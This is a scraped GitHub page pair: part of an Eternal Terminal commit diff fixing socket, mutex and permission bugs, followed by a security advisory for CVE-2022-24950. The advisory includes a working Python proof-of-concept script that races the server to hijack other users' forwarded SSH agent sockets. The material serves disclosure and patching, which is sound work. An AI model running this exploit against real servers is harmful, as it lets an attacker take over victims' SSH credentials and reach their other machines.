| +17  −0 |  | [easyloggingpp.pri](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-de3f4cfd8541bc1fbd3a59eb22aa558df828452133425e951c665a015674d334) |
| +1  −1 |  | [samples/Qt/fast-dictionary/listwithsearch.cc](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-6a6179609076857cd4f336e126db6b6573b5b420b3bc51fa3daccd18731516ac) |
| +2  −2 |  | [samples/Qt/fast-dictionary/listwithsearch.hh](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-4763b450ad9df300b0c083c3ec7b309e5bb6e966dcf52fedd90466dc5535d62c) |
| +1  −1 |  | [samples/Qt/fast-dictionary/mainwindow.cc](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-00a93fec916b9fea510a6a53604fac5a2413e4393b6e4c617563932cb0433b8b) |
| +1  −1 |  | [samples/Qt/file-splitter-joiner/about.ui](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-5af2fae3760f25934059ceec4c1400569abff917959de1e914b459c10e4ed798) |
| +1  −1 |  | [samples/Qt/file-splitter-joiner/partprocessor.cpp](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-ccbbdaf0587d83b1f64e59a3a8d96c1228df8e130a8ba6382b9eef369881326b) |
| +1  −1 |  | [samples/STL/crash.cpp](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-886515cc0c1f7f77ded25f5f04beb8700166707da308f47170f6cca39e05f9be) |
| +1  −1 |  | [samples/STL/occasional.cpp](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-98047cb9f57851453bd89c4ac82aa86838358754fcf8b91db61813fa01fe3f9b) |
| +1  −1 |  | [samples/send-to-network/README.md](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-e196582a3f9890a283ec6498e567a09447c775248bd9832c758d98cc62cc0dfb) |
| +67  −52 |  | [src/easylogging++.cc](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-d91b68244b96c2fd6b05c17bd2fe7028a81bb853d97f8908eddf43ee40858592) |
| +75  −40 |  | [src/easylogging++.h](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-96892457e20ef33aea53617529d5278d85411f07cc1a756addb3d12c46dd7654) |
| +1  −1 |  | [test/format-specifier-test.h](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-c4057b40a74c7cef07decbbd1d08b6ca1afc645d4898cacb2c6c6b7685b4c328) |
| +3  −3 |  | [tools/cpplint.py](/MisterTea/easyloggingpp/compare/5181b4039c04697aac7eac0bde44352cd8901567...532df6a32c6d743ac54f1d65dd220fb3249d4b8e#diff-cc07e0218fa142ad884be87236d14fbeefcd49b8d624c96b2b93046256142409) |

4 changes: 4 additions & 0 deletions

4
[src/base/LogHandler.cpp](#diff-57c21e8edeef445f9975e85c7aac47e63a0262a9a4ec643988b0bec03c47d616 "src/base/LogHandler.cpp")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/src/base/LogHandler.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -48,6 +48,10 @@ string LogHandler::stderrToFile(const string &pathPrefix) { |
|  |  | string current\_time(buffer); |
|  |  | string stderrFilename = pathPrefix + "\_stderr\_" + current\_time; |
|  |  | FILE \*stderr\_stream = freopen(stderrFilename.c\_str(), "w", stderr); |
|  |  | fs::permissions( |
|  |  | stderrFilename, |
|  |  | fs::perms::owner\_read | fs::perms::owner\_write | fs::perms::group\_read, |
|  |  | fs::perm\_options::replace); |
|  |  | if (!stderr\_stream) { |
|  |  | STFATAL << "Invalid filename " << stderrFilename; |
|  |  | } |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[src/base/PipeSocketHandler.cpp](#diff-b02c3b9d327f3fe8c6b6fc21b8c10170af0e6b52221bb16131634c994fe26a97 "src/base/PipeSocketHandler.cpp")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/src/base/PipeSocketHandler.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -13,7 +13,7 @@ int PipeSocketHandler::connect(const SocketEndpoint& endpoint) { |
|  |  | FATAL\_FAIL(sockFd); |
|  |  | initSocket(sockFd); |
|  |  | remote.sun\_family = AF\_UNIX; |
|  |  | strcpy(remote.sun\_path, pipePath.c\_str()); |
|  |  | strncpy(remote.sun\_path, pipePath.c\_str(), sizeof(remote.sun\_path)); |
|  |  |  |
|  |  | VLOG(3) << "Connecting to " << endpoint << " with fd " << sockFd; |
|  |  | int result = |
| Expand Down  Expand Up | | @@ -104,7 +104,7 @@ set<int> PipeSocketHandler::listen(const SocketEndpoint& endpoint) { |
|  |  | FATAL\_FAIL(fd); |
|  |  | initServerSocket(fd); |
|  |  | local.sun\_family = AF\_UNIX; /\* local is declared before socket() ^ \*/ |
|  |  | strcpy(local.sun\_path, pipePath.c\_str()); |
|  |  | strncpy(local.sun\_path, pipePath.c\_str(), sizeof(local.sun\_path)); |
|  |  | unlink(local.sun\_path); |
|  |  |  |
|  |  | FATAL\_FAIL(::bind(fd, (struct sockaddr\*)&local, sizeof(sockaddr\_un))); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/terminal/TerminalClient.cpp](#diff-f29fb56f4078609d8909017425b804ee10d50d1672e5cfcd9b384f5eba0fa64e "src/terminal/TerminalClient.cpp")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/src/terminal/TerminalClient.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -14,7 +14,7 @@ vector<PortForwardSourceRequest> parseRangesToRequests(const string& input) { |
|  |  | sourceDestination[1].find\_first\_not\_of("0123456789-") != |
|  |  | string::npos) { |
|  |  | PortForwardSourceRequest pfsr; |
|  |  | pfsr.mutable\_source()->set\_name(sourceDestination[0]); |
|  |  | pfsr.set\_environmentvariable(sourceDestination[0]); |
|  |  | pfsr.mutable\_destination()->set\_name(sourceDestination[1]); |
|  |  | pfsrs.push\_back(pfsr); |
|  |  | } else if (sourceDestination[0].find('-') != string::npos && |
| Expand Down | |  |

2 changes: 2 additions & 0 deletions

2
[src/terminal/UserTerminalRouter.cpp](#diff-a51fc296db97ed5232f76d78389f0ba095e9e0b22c079d50cd4b7f4da6608a11 "src/terminal/UserTerminalRouter.cpp")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/src/terminal/UserTerminalRouter.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,6 +16,7 @@ UserTerminalRouter::UserTerminalRouter( |
|  |  | } |
|  |  |  |
|  |  | IdKeyPair UserTerminalRouter::acceptNewConnection() { |
|  |  | lock\_guard<recursive\_mutex> guard(routerMutex); |
|  |  | LOG(INFO) << "Listening to id/key FIFO"; |
|  |  | int terminalFd = socketHandler->accept(serverFd); |
|  |  | if (terminalFd < 0) { |
| Expand Down  Expand Up | | @@ -49,6 +50,7 @@ IdKeyPair UserTerminalRouter::acceptNewConnection() { |
|  |  | } |
|  |  |  |
|  |  | TerminalUserInfo UserTerminalRouter::getInfoForId(const string &id) { |
|  |  | lock\_guard<recursive\_mutex> guard(routerMutex); |
|  |  | auto it = idInfoMap.find(id); |
|  |  | if (it == idInfoMap.end()) { |
|  |  | STFATAL << " Tried to read from an id that no longer exists"; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/terminal/UserTerminalRouter.hpp](#diff-e40bcecf9eec909d1bf5113c77b7f54281ce962830d8e4836f9c372fd0583ba7 "src/terminal/UserTerminalRouter.hpp")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/src/terminal/UserTerminalRouter.hpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,7 +2,6 @@ |
|  |  | #define \_\_ET\_USER\_TERMINAL\_ROUTER\_\_ |
|  |  |  |
|  |  | #include "Headers.hpp" |
|  |  |  |
|  |  | #include "PipeSocketHandler.hpp" |
|  |  | #include "ServerConnection.hpp" |
|  |  |  |
| Expand All | | @@ -24,6 +23,7 @@ class UserTerminalRouter { |
|  |  | int serverFd; |
|  |  | unordered\_map<string, TerminalUserInfo> idInfoMap; |
|  |  | shared\_ptr<PipeSocketHandler> socketHandler; |
|  |  | recursive\_mutex routerMutex; |
|  |  | }; |
|  |  | } // namespace et |
|  |  |  |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[src/terminal/forwarding/PortForwardHandler.cpp](#diff-0901b379da7c56c47ab0f680c0a8e4a57e195e66af64675e7c56be74ec080e0b "src/terminal/forwarding/PortForwardHandler.cpp")

Show comments

[View file](/MisterTea/EternalTerminal/blob/900348bb8bc96e1c7ba4888ac8480f643c43d3c3/src/terminal/forwarding/PortForwardHandler.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -45,6 +45,10 @@ PortForwardSourceResponse PortForwardHandler::createSource( |
|  |  | SocketEndpoint source; |
|  |  | if (pfsr.has\_source()) { |
|  |  | source = pfsr.source(); |
|  |  | if (source.has\_name()) { |
|  |  | throw runtime\_error( |
|  |  | "Named socket tunneling is only allowed with temporary filenames."); |
|  |  | } |
|  |  | } else { |
|  |  | // Make a random file to forward the pipe |
|  |  | string sourcePattern = |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `900348b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMisterTea%2FEternalTerminal%2Fcommit%2F900348bb8bc96e1c7ba4888ac8480f643c43d3c3) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e5197a50_20250114_211333.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmetaredteam%2Fexternal-disclosures%2Fsecurity%2Fadvisories%2FGHSA-85gw-pchc-4rf3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmetaredteam%2Fexternal-disclosures%2Fsecurity%2Fadvisories%2FGHSA-85gw-pchc-4rf3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=metaredteam%2Fexternal-disclosures)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[metaredteam](/metaredteam)
/
**[external-disclosures](/metaredteam/external-disclosures)**
Public

* [Notifications](/login?return_to=%2Fmetaredteam%2Fexternal-disclosures) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2Fmetaredteam%2Fexternal-disclosures)
* [Star
   27](/login?return_to=%2Fmetaredteam%2Fexternal-disclosures)

* [Code](/metaredteam/external-disclosures)
* [Pull requests
  0](/metaredteam/external-disclosures/pulls)
* [Security](/metaredteam/external-disclosures/security)
* [Insights](/metaredteam/external-disclosures/pulse)

Additional navigation options

* [Code](/metaredteam/external-disclosures)
* [Pull requests](/metaredteam/external-disclosures/pulls)
* [Security](/metaredteam/external-disclosures/security)
* [Insights](/metaredteam/external-disclosures/pulse)

# Eternal Terminal SSH Authorization Socket Hijacking

High

[vladionescu](/vladionescu)
published
GHSA-85gw-pchc-4rf3
Jul 20, 2022

## Package

Eternal Terminal
(C++)

## Affected versions

6.1.8

## Patched versions

6.1.9

## Description

# Vulnerability Description:

An authenticated attacker can utilize the local IPC socket on the Eternal Terminal server to invoke a race condition when other users login, resulting in ownership of forwarded ssh-agent sockets being transferred to the attacker. The attacker can then utilize this socket to login to any other machine that the targeted user could normally log into via SSH.

The issue is due to a logic bug in `UserTerminalRouter::getInfoForId()` where the user info for a client connection is pulled from a mutable `unordered_map` named `idInfoMap`. This user info is retrieved in `TerminalServer::run()` and later passed to `pipeSocketHandler::listen()` in order to set permissions properly on the forwarded SSH socket. A local attacker can monitor logs to reliably modify the contents of `idInfoMap` such that the forwarded SSH socket ownership is given to the attacker.

One interesting side effect of the PoC as it's written is that the victim will be given a session as the attacker upon logging on. There may be ways to mitigate this (including modifying shell startup, login procedure, etc.)

To run the proof of concept log in as an unprivileged user on the server Eternal Terminal and run the script. It will change the permissions of the forwarded SSH socket created by Eternal Terminal which you can use to subsequently log into other machines the victim can access.

# Proof of Concept:

```
#!/usr/bin/env python3
import time
import os
import argparse
import sys
import subprocess
import threading
import glob
import pwd

parser = argparse.ArgumentParser(description='[*] Hijack SSH_AUTH_SOCK of ET users as they log in')
args = parser.parse_args()

def get_username():
    return pwd.getpwuid( os.getuid() )[ 0 ]

#determine log file to watch
def determine_latest_log():
    logs = glob.glob('/tmp/etserver-*')
    max_mtime = 0
    for log_name in logs:
        mtime = os.stat(log_name).st_mtime
        if mtime > max_mtime:
            max_mtime = mtime
            latest_log = log_name
    print(f'[*] Found log {latest_log}')
    return latest_log

#poll logs and watch for new client registrations
def follow_log(log_name):
    print(f'[*] Watching for logins..')
    with open(log_name, 'r') as f:
        f.seek(0,2) #End of file
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.01)
            elif 'Got client with id: ' in line:
                client_id = line.split('Got client with id: ')[1].rstrip('\n')
                print("Modifying idInfoMap mapping")
                echo = subprocess.Popen(["echo", f'{client_id}/E59AD03E34FC3AB9DED568F47EA27677_xterm-256color\n'], stdout=subprocess.PIPE)
                etterminal = subprocess.Popen(["/bin/etterminal", "&"], stdin=echo.stdout, close_fds=True)
                print("[*] Testing for race success")
                while True:
                    line = f.readline()
                    if not line:
                        time.sleep(0.01)
                    elif 'Creating pipe at ' in line:
                        socket_name = line.split('Creating pipe at ')[1].rstrip('\n')
                        if check_permissions_on_socket(socket_name):
                            print(f'[*] We good ^_^. Run the command shown below then SSH into your target.')
                            print(f'export SSH_AUTH_SOCK={socket_name}')
                            exit(1)
                        else:
                            print(f'Sorry, something went wrong! :(')
                            exit(1)

def check_permissions_on_socket(socket_name):
    return get_username() == pwd.getpwuid(os.stat(socket_name).st_uid).pw_name

latest_log = determine_latest_log()
follow_log(latest_log)

```
# Timeline:

10/29/21: Vulnerabilities were disclosed to author of ET

11/3/21: Partial fixes for the most serious issues to ET were released (including this one)

1/27/22: 90 day deadline for public disclosure reached

### Severity

High

### CVE ID

CVE-2022-24950

### Weaknesses

No CWEs

### Credits

* [![@adi-ajit](https://avatars.githubusercontent.com/u/92882703?s=40&v=4)](/adi-ajit)
  [adi-ajit](/adi-ajit)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


